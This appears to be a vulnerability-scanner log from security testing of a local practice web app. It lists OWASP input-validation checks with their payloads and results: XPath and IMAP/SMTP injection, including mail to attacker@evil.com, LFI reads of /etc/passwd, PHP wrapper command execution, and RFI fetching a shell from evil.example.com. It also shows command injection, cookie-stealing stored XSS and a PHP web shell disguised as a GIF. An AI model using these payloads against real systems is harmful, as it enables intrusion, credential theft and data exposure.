+2025-08-05 01:12:09.112640 |     [✓] Possible XML/XPath processing with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:09.112640 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 01:12:09.119564 |   - Testing parameter: txtName
+2025-08-05 01:12:09.182032 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:09.244014 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:09.304044 |     [✓] Possible XML/XPath processing with payload '') or ('1'='1'
+2025-08-05 01:12:09.366187 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:09.429576 |     [✓] Possible XML/XPath processing with payload '' or position()=1 or ''=''
+2025-08-05 01:12:09.489727 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:09.550539 |     [✓] Possible XML/XPath processing with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:09.613953 |     [✓] Possible XML/XPath processing with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:09.668817 |     [✓] Possible XML/XPath processing with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:09.731479 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=''
+2025-08-05 01:12:09.791135 |     [✓] Possible XML/XPath processing with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:09.850011 |     [✓] Possible XML/XPath processing with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:09.851201 |   - Testing parameter: btnSign
+2025-08-05 01:12:09.912316 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:09.968132 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:10.026169 |     [✓] Possible XML/XPath processing with payload '') or ('1'='1'
+2025-08-05 01:12:10.085609 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:10.148175 |     [✓] Possible XML/XPath processing with payload '' or position()=1 or ''=''
+2025-08-05 01:12:10.207480 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:10.267668 |     [✓] Possible XML/XPath processing with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:10.324314 |     [✓] Possible XML/XPath processing with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:10.384033 |     [✓] Possible XML/XPath processing with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:10.448851 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=''
+2025-08-05 01:12:10.505916 |     [✓] Possible XML/XPath processing with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:10.566554 |     [✓] Possible XML/XPath processing with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:10.566554 |   - Testing parameter: btnClear
+2025-08-05 01:12:10.624180 |     [✓] Possible XML/XPath processing with payload '' or '1'='1'
+2025-08-05 01:12:10.687886 |     [✓] Possible XML/XPath processing with payload '' or ''=''
+2025-08-05 01:12:10.744021 |     [✓] Possible XML/XPath processing with payload '') or ('1'='1'
+2025-08-05 01:12:10.804158 |     [✓] Possible XML/XPath processing with payload '' or 1=1 or ''=''
+2025-08-05 01:12:10.867395 |     [✓] Possible XML/XPath processing with payload '' or position()=1 or ''=''
+2025-08-05 01:12:10.933932 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=1 or ''=''
+2025-08-05 01:12:10.994686 |     [✓] Possible XML/XPath processing with payload '' or string-length(name(/*[1]))=4 or ''=''
+2025-08-05 01:12:11.054072 |     [✓] Possible XML/XPath processing with payload '' and count(/*)=1 and '1'='1'
+2025-08-05 01:12:11.113956 |     [✓] Possible XML/XPath processing with payload '' and string-length(name(/*[1]))=4 and '1'='1'
+2025-08-05 01:12:11.174400 |     [✓] Possible XML/XPath processing with payload '' or count(/*)=''
+2025-08-05 01:12:11.234813 |     [✓] Possible XML/XPath processing with payload '' or contains(name(/*[1]),'x') or ''=''
+2025-08-05 01:12:11.297495 |     [✓] Possible XML/XPath processing with payload '' or //user[position()=1]/username | //user[position()=1]/password or ''=''
+2025-08-05 01:12:11.298041 | ----- OTG-INPVAL-010 Test Completed -----
+
+2025-08-05 01:12:11.298041 | ----- Starting OTG-INPVAL-011 (IMAP/SMTP Injection) -----
+2025-08-05 01:12:11.299136 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 01:12:11.304534 |   - Testing parameter: ip
+2025-08-05 01:12:11.359030 |     [✓] IMAP mailbox selection with payload '"'
+2025-08-05 01:12:11.415572 |     [✓] IMAP mailbox selection with payload '''
+2025-08-05 01:12:11.483257 |     [✓] IMAP mailbox selection with payload '\'
+2025-08-05 01:12:11.537733 |     [✓] IMAP mailbox selection with payload '#'
+2025-08-05 01:12:11.600189 |     [✓] IMAP mailbox selection with payload '!'
+2025-08-05 01:12:11.650218 |     [✓] IMAP mailbox selection with payload '|'
+2025-08-05 01:12:11.704391 |     [✓] IMAP mailbox selection with payload 'INBOX" CREATE EvilFolder'
+2025-08-05 01:12:11.761898 |     [✓] IMAP mailbox selection with payload 'INBOX" DELETE ImportantFolder'
+2025-08-05 01:12:11.818470 |     [✓] IMAP mailbox selection with payload 'INBOX" RENAME FolderA FolderB'
+2025-08-05 01:12:11.872063 |     [✓] IMAP mailbox selection with payload 'test@example.com" RCPT TO:attacker@evil.com'
+2025-08-05 01:12:11.926698 |     [✓] IMAP mailbox selection with payload 'test@example.com" VRFY root'
+2025-08-05 01:12:11.981973 |     [✓] IMAP mailbox selection with payload 'test@example.com" EXPN admin-group'
+2025-08-05 01:12:12.042082 |     [✓] IMAP mailbox selection with payload '%0d%0aCAPABILITY'
+2025-08-05 01:12:12.102608 |     [✓] IMAP mailbox selection with payload '%0d%0aNOOP'
+2025-08-05 01:12:12.162443 |     [✓] IMAP mailbox selection with payload '%0d%0aAUTHENTICATE PLAIN'
+2025-08-05 01:12:12.226925 |     [✓] IMAP mailbox selection with payload 'INBOX"%0d%0aCREATE EvilFolder%0d%0aINBOX"'
+2025-08-05 01:12:12.279859 |     [✓] IMAP mailbox selection with payload 'test@example.com"%0d%0aMAIL FROM:attacker@evil.com%0d%0aRCPT TO:attacker@evil.com'
+2025-08-05 01:12:12.335484 |     [✓] IMAP mailbox selection with payload 'INBOX" AND 1=1'
+2025-08-05 01:12:12.402238 |     [✓] IMAP mailbox selection with payload 'test@example.com' OR '1'='1'
+2025-08-05 01:12:12.402761 |   - Testing parameter: Submit
+2025-08-05 01:12:12.458968 |     [✓] IMAP mailbox selection with payload '"'
+2025-08-05 01:12:12.513375 |     [✓] IMAP mailbox selection with payload '''
+2025-08-05 01:12:12.565524 |     [✓] IMAP mailbox selection with payload '\'
+2025-08-05 01:12:12.621154 |     [✓] IMAP mailbox selection with payload '#'
+2025-08-05 01:12:12.677277 |     [✓] IMAP mailbox selection with payload '!'
+2025-08-05 01:12:12.729177 |     [✓] IMAP mailbox selection with payload '|'
+2025-08-05 01:12:12.789186 |     [✓] IMAP mailbox selection with payload 'INBOX" CREATE EvilFolder'
+2025-08-05 01:12:12.846121 |     [✓] IMAP mailbox selection with payload 'INBOX" DELETE ImportantFolder'
+2025-08-05 01:12:12.900913 |     [✓] IMAP mailbox selection with payload 'INBOX" RENAME FolderA FolderB'
+2025-08-05 01:12:12.955510 |     [✓] IMAP mailbox selection with payload 'test@example.com" RCPT TO:attacker@evil.com'
+2025-08-05 01:12:13.009961 |     [✓] IMAP mailbox selection with payload 'test@example.com" VRFY root'
+2025-08-05 01:12:13.065793 |     [✓] IMAP mailbox selection with payload 'test@example.com" EXPN admin-group'
+2025-08-05 01:12:13.125521 |     [✓] IMAP mailbox selection with payload '%0d%0aCAPABILITY'
+2025-08-05 01:12:13.185172 |     [✓] IMAP mailbox selection with payload '%0d%0aNOOP'
+2025-08-05 01:12:13.238698 |     [✓] IMAP mailbox selection with payload '%0d%0aAUTHENTICATE PLAIN'
+2025-08-05 01:12:13.292392 |     [✓] IMAP mailbox selection with payload 'INBOX"%0d%0aCREATE EvilFolder%0d%0aINBOX"'
+2025-08-05 01:12:13.347086 |     [✓] IMAP mailbox selection with payload 'test@example.com"%0d%0aMAIL FROM:attacker@evil.com%0d%0aRCPT TO:attacker@evil.com'
+2025-08-05 01:12:13.399114 |     [✓] IMAP mailbox selection with payload 'INBOX" AND 1=1'
+2025-08-05 01:12:13.454402 |     [✓] IMAP mailbox selection with payload 'test@example.com' OR '1'='1'
+2025-08-05 01:12:13.454402 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:12:13.463982 |   - Testing parameter: id
+2025-08-05 01:12:13.463982 |     [✓] IMAP mailbox selection with payload '"'
+2025-08-05 01:12:13.469019 |     [!] Possible IMAP/SMTP injection - error with payload '''
+2025-08-05 01:12:13.469019 |     [!] Possible IMAP/SMTP injection - error with payload '\'
+2025-08-05 01:12:13.475431 |     [✓] IMAP mailbox selection with payload '#'
+2025-08-05 01:12:13.477980 |     [✓] IMAP mailbox selection with payload '!'
+2025-08-05 01:12:13.477980 |     [✓] IMAP mailbox selection with payload '|'
+2025-08-05 01:12:13.484106 |     [✓] IMAP mailbox selection with payload 'INBOX" CREATE EvilFolder'
+2025-08-05 01:12:13.484106 |     [✓] IMAP mailbox selection with payload 'INBOX" DELETE ImportantFolder'
+2025-08-05 01:12:13.494365 |     [✓] IMAP mailbox selection with payload 'INBOX" RENAME FolderA FolderB'
+2025-08-05 01:12:13.496496 |     [✓] IMAP mailbox selection with payload 'test@example.com" RCPT TO:attacker@evil.com'
+2025-08-05 01:12:13.496496 |     [✓] IMAP mailbox selection with payload 'test@example.com" VRFY root'
+2025-08-05 01:12:13.504315 |     [✓] IMAP mailbox selection with payload 'test@example.com" EXPN admin-group'
+2025-08-05 01:12:13.508149 |     [✓] IMAP mailbox selection with payload '%0d%0aCAPABILITY'
+2025-08-05 01:12:13.511626 |     [✓] IMAP mailbox selection with payload '%0d%0aNOOP'
+2025-08-05 01:12:13.514130 |     [✓] IMAP mailbox selection with payload '%0d%0aAUTHENTICATE PLAIN'
+2025-08-05 01:12:13.518460 |     [✓] IMAP mailbox selection with payload 'INBOX"%0d%0aCREATE EvilFolder%0d%0aINBOX"'
+2025-08-05 01:12:13.521791 |     [✓] IMAP mailbox selection with payload 'test@example.com"%0d%0aMAIL FROM:attacker@evil.com%0d%0aRCPT TO:attacker@evil.com'
+2025-08-05 01:12:13.525108 |     [✓] IMAP mailbox selection with payload 'INBOX" AND 1=1'
+2025-08-05 01:12:13.528382 |     [✓] IMAP mailbox selection with payload 'test@example.com' OR '1'='1'
+2025-08-05 01:12:13.528382 |   - Testing parameter: Submit
+2025-08-05 01:12:13.532508 |     [✓] IMAP mailbox selection with payload '"'
+2025-08-05 01:12:13.536021 |     [✓] IMAP mailbox selection with payload '''
+2025-08-05 01:12:13.539146 |     [✓] IMAP mailbox selection with payload '\'
+2025-08-05 01:12:13.542245 |     [✓] IMAP mailbox selection with payload '#'
+2025-08-05 01:12:13.545911 |     [✓] IMAP mailbox selection with payload '!'
+2025-08-05 01:12:13.549340 |     [✓] IMAP mailbox selection with payload '|'
+2025-08-05 01:12:13.551834 |     [✓] IMAP mailbox selection with payload 'INBOX" CREATE EvilFolder'
+2025-08-05 01:12:13.555190 |     [✓] IMAP mailbox selection with payload 'INBOX" DELETE ImportantFolder'
+2025-08-05 01:12:13.558804 |     [✓] IMAP mailbox selection with payload 'INBOX" RENAME FolderA FolderB'
+2025-08-05 01:12:13.561833 |     [✓] IMAP mailbox selection with payload 'test@example.com" RCPT TO:attacker@evil.com'
+2025-08-05 01:12:13.565697 |     [✓] IMAP mailbox selection with payload 'test@example.com" VRFY root'
+2025-08-05 01:12:13.568759 |     [✓] IMAP mailbox selection with payload 'test@example.com" EXPN admin-group'
+2025-08-05 01:12:13.572702 |     [✓] IMAP mailbox selection with payload '%0d%0aCAPABILITY'
+2025-08-05 01:12:13.576257 |     [✓] IMAP mailbox selection with payload '%0d%0aNOOP'
+2025-08-05 01:12:13.579449 |     [✓] IMAP mailbox selection with payload '%0d%0aAUTHENTICATE PLAIN'
+2025-08-05 01:12:13.582166 |     [✓] IMAP mailbox selection with payload 'INBOX"%0d%0aCREATE EvilFolder%0d%0aINBOX"'
+2025-08-05 01:12:13.585856 |     [✓] IMAP mailbox selection with payload 'test@example.com"%0d%0aMAIL FROM:attacker@evil.com%0d%0aRCPT TO:attacker@evil.com'
+2025-08-05 01:12:13.589336 |     [✓] IMAP mailbox selection with payload 'INBOX" AND 1=1'
+2025-08-05 01:12:13.592786 |     [✓] IMAP mailbox selection with payload 'test@example.com' OR '1'='1'
+2025-08-05 01:12:13.593395 | 
+[i] Testing URL: http://localhost:8080/contact.php
+2025-08-05 01:12:13.595402 |   - No forms found on page
+2025-08-05 01:12:13.595839 | ----- OTG-INPVAL-011 Test Completed -----
+
+2025-08-05 01:12:13.596155 | ----- Starting OTG-INPVAL-012 (Code Injection - LFI/RFI) -----
+2025-08-05 01:12:13.596155 | 
+[i] Testing default file inclusion behavior
+2025-08-05 01:12:13.599783 |   - Default response length: 3861 bytes
+2025-08-05 01:12:13.599783 | 
+[i] Testing for Local File Inclusion (LFI)
+2025-08-05 01:12:13.607736 |   [✓] /etc/passwd disclosure with payload '/etc/passwd'
+2025-08-05 01:12:13.615449 |   [✓] /etc/passwd disclosure with payload '../../../../../../etc/passwd'
+2025-08-05 01:12:13.619893 |   [!] Different response length (3244 bytes) with payload '../../../../../../etc/passwd%00'
+2025-08-05 01:12:13.625603 |   [!] Different response length (3244 bytes) with payload '....//....//....//etc/passwd'
+2025-08-05 01:12:13.629433 |   [!] Different response length (3416 bytes) with payload '/etc/hosts'
+2025-08-05 01:12:13.633806 |   [!] Different response length (3244 bytes) with payload '/proc/self/environ'
+2025-08-05 01:12:13.637736 |   [!] Different response length (3244 bytes) with payload '../../../../../../windows/system32/drivers/etc/hosts'
+2025-08-05 01:12:13.640281 |   [✓] /etc/passwd disclosure with payload 'file:///etc/passwd'
+2025-08-05 01:12:13.641286 | 
+[i] Testing PHP wrappers
+2025-08-05 01:12:13.645436 |   [✓] Possible PHP source code disclosure with wrapper 'php://filter/convert.base64-encode/resource=include.php'
+2025-08-05 01:12:13.649947 |   [✓] Possible PHP source code disclosure with wrapper 'php://filter/convert.base64-encode/resource=index.php'
+2025-08-05 01:12:13.662289 |   [✓] Possible command execution with wrapper 'data://text/plain,<?php echo shell_exec('id'); ?>'
+2025-08-05 01:12:13.669333 |   [✓] Possible command execution with wrapper 'data://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCdpZCcpOyA/Pg=='
+2025-08-05 01:12:13.674346 |   [-] No obvious PHP wrapper exploitation with 'expect://id'
+2025-08-05 01:12:13.677373 | 
+[i] Testing for Remote File Inclusion (RFI)
+2025-08-05 01:12:14.215546 |   [-] No obvious RFI with payload 'http://evil.example.com/shell.txt'
+2025-08-05 01:12:14.219489 |   [-] No obvious RFI with payload '\\evil.example.com\share\shell.txt'
+2025-08-05 01:12:14.219489 | ----- OTG-INPVAL-012 Test Completed -----
+
+2025-08-05 01:12:14.220066 | ----- Starting OTG-INPVAL-013 (Command Injection) -----
+2025-08-05 01:12:14.220066 | [i] Testing URL: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 01:12:14.225171 |   - Found input parameter: ip
+2025-08-05 01:12:17.430389 |     [✓] Possible command execution (id) with payload '127.0.0.1; id'
+2025-08-05 01:12:20.595929 |     [✓] Possible command execution (ping) with payload '127.0.0.1 && whoami'
+2025-08-05 01:12:23.754947 |     [✓] Possible command execution (ls -la) with payload '127.0.0.1 | ls -la'
+2025-08-05 01:12:26.921014 |     [✓] Possible command execution (ping) with payload '127.0.0.1 || uname -a'
+2025-08-05 01:12:27.007780 |     [-] No obvious command injection with payload '127.0.0.1$(echo 'TESTING')'
+2025-08-05 01:12:27.028210 |     [-] No obvious command injection with payload '127.0.0.1`echo 'TESTING'`'
+2025-08-05 01:12:30.235279 |     [✓] Possible command execution (ping) with payload '127.0.0.1; echo $(whoami)'
+2025-08-05 01:12:33.402348 |     [✓] Possible /etc/passwd disclosure with payload '127.0.0.1 && cat /etc/passwd'
+2025-08-05 01:12:36.563727 |     [✓] Possible command execution (ping) with payload '127.0.0.1 & ipconfig'
+2025-08-05 01:12:39.734049 |     [-] No obvious command injection with payload '127.0.0.1 | dir'
+2025-08-05 01:12:42.907558 |     [✓] Possible command execution (ping) with payload '127.0.0.1; ping -c 1 localhost'
+2025-08-05 01:12:51.328612 |     [✓] Possible command execution (ping) with payload '127.0.0.1 && sleep 5'
+2025-08-05 01:12:54.500764 |     [✓] Possible command execution (ping) with payload '127.0.0.1' whoami ''
+2025-08-05 01:12:57.664446 |     [✓] Possible command execution (ping) with payload '127.0.0.1" && ls "'
+2025-08-05 01:13:00.844380 |     [✓] Possible command execution (id) with payload '127.0.0.1
+id
+'
+2025-08-05 01:13:00.870372 |     [-] No obvious command injection with payload '127.0.0.1%3Bid%00'
+2025-08-05 01:13:00.935296 |     [-] No obvious command injection with payload '127.0.0.1%26%26whoami'
+2025-08-05 01:13:00.935823 | ----- OTG-INPVAL-013 Test Completed -----
+
+2025-08-05 01:13:00.936346 | ----- Starting OTG-INPVAL-014 (Buffer Overflow Testing) -----
+2025-08-05 01:13:00.936875 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/exec/
+2025-08-05 01:13:00.943207 |   - Testing parameter: ip
+2025-08-05 01:13:00.997421 |     [-] No obvious buffer issues with Simple long string (10k chars)
+2025-08-05 01:13:01.047401 |     [-] No obvious buffer issues with Null byte pattern (5k bytes)
+2025-08-05 01:13:01.107957 |     [-] No obvious buffer issues with Format string specifiers
+2025-08-05 01:13:01.166074 |     [-] No obvious buffer issues with Repeating pattern (10k bytes)
+2025-08-05 01:13:01.218999 |     [-] No obvious buffer issues with Hex pattern repetition
+2025-08-05 01:13:01.277938 |     [-] No obvious buffer issues with Very long string (100k chars)
+2025-08-05 01:13:01.346669 |     [-] No obvious buffer issues with Extremely long string (1M chars)
+2025-08-05 01:13:01.408528 |     [-] No obvious buffer issues with Format string (%s)
+2025-08-05 01:13:01.463198 |     [-] No obvious buffer issues with Format string (%x)
+2025-08-05 01:13:01.516716 |     [-] No obvious buffer issues with Format string (%n)
+2025-08-05 01:13:01.574256 |     [-] No obvious buffer issues with Hex FF pattern
+2025-08-05 01:13:01.628227 |     [-] No obvious buffer issues with Hex incrementing pattern
+2025-08-05 01:13:01.628227 |   - Testing parameter: Submit
+2025-08-05 01:13:01.685075 |     [-] No obvious buffer issues with Simple long string (10k chars)
+2025-08-05 01:13:01.740404 |     [-] No obvious buffer issues with Null byte pattern (5k bytes)
+2025-08-05 01:13:01.794535 |     [-] No obvious buffer issues with Format string specifiers
+2025-08-05 01:13:01.847739 |     [-] No obvious buffer issues with Repeating pattern (10k bytes)
+2025-08-05 01:13:01.904071 |     [-] No obvious buffer issues with Hex pattern repetition
+2025-08-05 01:13:01.954686 |     [-] No obvious buffer issues with Very long string (100k chars)
+2025-08-05 01:13:02.017259 |     [-] No obvious buffer issues with Extremely long string (1M chars)
+2025-08-05 01:13:02.065739 |     [-] No obvious buffer issues with Format string (%s)
+2025-08-05 01:13:02.124137 |     [-] No obvious buffer issues with Format string (%x)
+2025-08-05 01:13:02.177009 |     [-] No obvious buffer issues with Format string (%n)
+2025-08-05 01:13:02.237587 |     [-] No obvious buffer issues with Hex FF pattern
+2025-08-05 01:13:02.295224 |     [-] No obvious buffer issues with Hex incrementing pattern
+2025-08-05 01:13:02.295748 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/fi/
+2025-08-05 01:13:02.306836 |   - No forms found on page
+2025-08-05 01:13:02.307354 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:13:02.314137 |   - Testing parameter: id
+2025-08-05 01:13:02.320436 |     [!] HTTP 414 with Simple long string (10k chars)
+2025-08-05 01:13:02.337199 |     [!] HTTP 414 with Null byte pattern (5k bytes)
+2025-08-05 01:13:02.346297 |     [-] No obvious buffer issues with Format string specifiers
+2025-08-05 01:13:02.350051 |     [!] HTTP 414 with Repeating pattern (10k bytes)
+2025-08-05 01:13:02.360768 |     [!] HTTP 414 with Hex pattern repetition
+2025-08-05 01:13:02.395381 |     [!] HTTP 414 with Very long string (100k chars)
+2025-08-05 01:13:32.778330 |     [!] Timeout occurred with Extremely long string (1M chars) - possible DoS vulnerability
+2025-08-05 01:13:32.787708 |     [-] No obvious buffer issues with Format string (%s)
+2025-08-05 01:13:32.794786 |     [-] No obvious buffer issues with Format string (%x)
+2025-08-05 01:13:32.799461 |     [-] No obvious buffer issues with Format string (%n)
+2025-08-05 01:13:32.817025 |     [!] HTTP 414 with Hex FF pattern
+2025-08-05 01:13:32.842852 |     [!] HTTP 414 with Hex incrementing pattern
+2025-08-05 01:13:32.843854 |   - Testing parameter: Submit
+2025-08-05 01:13:32.852069 |     [!] HTTP 414 with Simple long string (10k chars)
+2025-08-05 01:13:32.865044 |     [!] HTTP 414 with Null byte pattern (5k bytes)
+2025-08-05 01:13:32.875042 |     [-] No obvious buffer issues with Format string specifiers
+2025-08-05 01:13:32.875042 |     [!] HTTP 414 with Repeating pattern (10k bytes)
+2025-08-05 01:13:32.888356 |     [!] HTTP 414 with Hex pattern repetition
+2025-08-05 01:13:32.934951 |     [!] HTTP 414 with Very long string (100k chars)
+2025-08-05 01:14:03.359413 |     [!] Timeout occurred with Extremely long string (1M chars) - possible DoS vulnerability
+2025-08-05 01:14:03.375511 |     [-] No obvious buffer issues with Format string (%s)
+2025-08-05 01:14:03.379952 |     [-] No obvious buffer issues with Format string (%x)
+2025-08-05 01:14:03.384333 |     [-] No obvious buffer issues with Format string (%n)
+2025-08-05 01:14:03.404174 |     [!] HTTP 414 with Hex FF pattern
+2025-08-05 01:14:03.426785 |     [!] HTTP 414 with Hex incrementing pattern
+2025-08-05 01:14:03.427308 | 
+[i] Testing URL: http://localhost:8080/contact.php
+2025-08-05 01:14:03.431498 |   - No forms found on page
+2025-08-05 01:14:03.432028 | ----- OTG-INPVAL-014 Test Completed -----
+
+2025-08-05 01:14:03.432549 | ----- Starting OTG-INPVAL-015 (Incubated Vulnerability Testing) -----
+2025-08-05 01:14:03.432549 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/xss_s/
+2025-08-05 01:14:03.437877 |   - Testing parameter: txtName
+2025-08-05 01:14:03.499738 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:03.499738 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:03.564260 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:03.565764 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:03.623444 |     [✓] Payload appears stored: PHP shell in fake GIF
+2025-08-05 01:14:03.623444 |     [*] Manual verification needed for: GIF89a;<?php system($_GET['cmd']); ?>...
+2025-08-05 01:14:03.685923 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:03.685923 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:03.751682 |     [✓] Payload appears stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:03.751682 |     [*] Manual verification needed for: admin' OR 1=1; UPDATE guestbook SET comment=CONCAT...
+2025-08-05 01:14:03.751682 |   - Testing parameter: btnSign
+2025-08-05 01:14:03.812256 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:03.812256 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:03.870630 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:03.871630 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:03.930620 |     [-] Payload not stored: PHP shell in fake GIF
+2025-08-05 01:14:03.992433 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:03.993451 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:04.045588 |     [-] Payload not stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:04.045588 |   - Testing parameter: btnClear
+2025-08-05 01:14:04.109920 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:04.109920 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:04.176037 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:04.176559 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:04.235840 |     [-] Payload not stored: PHP shell in fake GIF
+2025-08-05 01:14:04.295683 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:04.296953 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:04.356652 |     [-] Payload not stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:04.357763 |   - Testing parameter: mtxMessage
+2025-08-05 01:14:04.417942 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:04.417942 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:04.478017 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:04.478017 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:04.535579 |     [✓] Payload appears stored: PHP shell in fake GIF
+2025-08-05 01:14:04.535579 |     [*] Manual verification needed for: GIF89a;<?php system($_GET['cmd']); ?>...
+2025-08-05 01:14:04.598245 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:04.598245 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:04.660103 |     [✓] Payload appears stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:04.660504 |     [*] Manual verification needed for: admin' OR 1=1; UPDATE guestbook SET comment=CONCAT...
+2025-08-05 01:14:04.660504 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/upload/
+2025-08-05 01:14:04.672648 |   - Testing parameter: uploaded
+2025-08-05 01:14:04.724604 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:04.724604 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:04.774165 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:04.775670 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:04.826822 |     [-] Payload not stored: PHP shell in fake GIF
+2025-08-05 01:14:04.876329 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:04.876329 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:04.927186 |     [-] Payload not stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:04.927716 |   - Testing parameter: Upload
+2025-08-05 01:14:04.977612 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:04.977921 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:05.027087 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:05.027087 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:05.076353 |     [-] Payload not stored: PHP shell in fake GIF
+2025-08-05 01:14:05.128530 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:05.128530 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:05.179651 |     [-] Payload not stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:05.179651 | 
+[i] Testing URL: http://localhost:8080/vulnerabilities/sqli/
+2025-08-05 01:14:05.186616 |   - Testing parameter: id
+2025-08-05 01:14:05.190660 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:05.191662 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:05.195674 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:05.195674 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:05.199687 |     [-] Payload not stored: PHP shell in fake GIF
+2025-08-05 01:14:05.202989 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:05.204113 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:05.206941 |     [-] Payload not stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:05.206941 |   - Testing parameter: Submit
+2025-08-05 01:14:05.210687 |     [✓] Payload appears stored: Stored XSS to capture cookies
+2025-08-05 01:14:05.210687 |     [*] Manual verification needed for: <script>document.write('<img src="http://localhost...
+2025-08-05 01:14:05.213686 |     [✓] Payload appears stored: Silent cookie capture
+2025-08-05 01:14:05.214804 |     [*] Manual verification needed for: <script>new Image().src="http://localhost:8000/col...
+2025-08-05 01:14:05.218258 |     [-] Payload not stored: PHP shell in fake GIF
+2025-08-05 01:14:05.221823 |     [✓] Payload appears stored: HTML file with XSS
+2025-08-05 01:14:05.221823 |     [*] Manual verification needed for: <script>alert("Incubated XSS")</script>...
+2025-08-05 01:14:05.225798 |     [-] Payload not stored: SQLi to inject XSS into all comments
+2025-08-05 01:14:05.225798 | 
+[i] Note: Incubated vulnerabilities require manual verification:
+2025-08-05 01:14:05.225798 |     - Check if payloads execute when pages are revisited
+2025-08-05 01:14:05.225798 |     - Monitor your listener for callbacks
